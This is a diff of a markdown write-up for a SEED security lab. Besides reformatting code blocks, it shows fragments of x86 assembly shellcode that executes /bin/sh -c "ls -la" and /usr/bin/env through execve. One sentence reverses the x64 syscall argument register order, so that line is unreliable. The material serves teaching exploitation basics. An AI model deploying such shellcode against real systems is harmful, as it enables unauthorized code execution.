@@ -100,7 +100,8 @@ This means EAX would store the execve function itself (execve has a system call 
 
 <details>
 <summary>Seed lab code</summary>
-<pre><code>
+
+```assembly
 section .text
   global _start
     _start:
@@ -120,12 +121,14 @@ section .text
       xor eax, eax ; eax = 0x00000000
       mov al, 0x0b ; eax = 0x0000000b
       int 0x80
-</code></pre>
+```
+
 </details>
 
 <details>
 <summary>My solution to <code>/bin/sh -c "ls -la"</code></summary>
-<pre><code>
+
+```assembly
 section .text
   global _start
     _start:
@@ -167,12 +170,14 @@ section .text
       xor  eax, eax     ; eax = 0x00000000
       mov   al, 0x0b    ; eax = 0x0000000b
       int 0x80
-</code></pre>
+```
+
 </details>
 
 <details>
 <summary>My solution to <code>/usr/bin/env</code> (supplying environment variables)</summary>
-<pre><code>
+
+```assembly
 section .text
   global _start
     _start:    
@@ -222,7 +227,8 @@ section .text
       xor  eax, eax     ; eax = 0x00000000
       mov   al, 0x0b    ; eax = 0x0000000b
       int 0x80
-</code></pre>
+```
+
 </details>
 
 #### Using Code Segment
@@ -231,7 +237,8 @@ Rather than dynamically constructing all the necessary data structures on the st
 
 <details>
 <summary>My solution to <code>/bin/sh -c "ls -la"</code> using code segment</summary>
-<pre><code>
+
+```assembly
 section .text
   global _start
     _start:
@@ -239,7 +246,7 @@ section .text
 	    jmp short two
     one:
  	    pop esi
-     	xor eax, eax
+     	    xor eax, eax
  	
  	    mov [esi+7],  al   ; /bin/sh%0
  	    mov [esi+10], al   ; -c%0
@@ -266,12 +273,14 @@ section .text
  	    db '/bin/sh*-c*ls -la*AAAABBBBCCCCDDDD'
  	       ;01234567890123456789012345678901234
  	       ;          1         2         3
-</code></pre>
+```
+
 </details>
 
 <details>
 <summary>My solution to <code>/usr/bin/env</code> (supplying environment variables) using code segment</summary>
-<pre><code>
+
+```assembly
 section .text
   global _start
     _start:
@@ -309,19 +318,25 @@ section .text
  	    db '/usr/bin/env*a=11*bb=22*ccc=4567*AAAABBBBCCCCDDDDEEEE'
  	    ;   01234567890123456789012345678901234567890123456789012
  	    ;             1         2         3         4         5 
-</code></pre>
+```
+
 </details>
+
+___
 
 Writing 64-bit shellcode is not too different to writing 32-bit shellcode. The differences are mainly in the registers. For the x64 architecture, invoking system call
 is done through the syscall instruction, and the first three arguments for the system call are stored in the rdx, rsi, rdi registers, respectively.
 <details>
 <summary>64-bit equivalent registers</summary>
-<ul>
-<li>eax = rax</li>
-<li>ebx = rdi</li>
-<li>ecx = rsi</li>
-<li>edx = rdx</li>
-</ul>
+
+- eax = rax
+
+- ebx = rdi
+
+- ecx = rsi
+
+- edx = rdx
+
 </details>
 
 
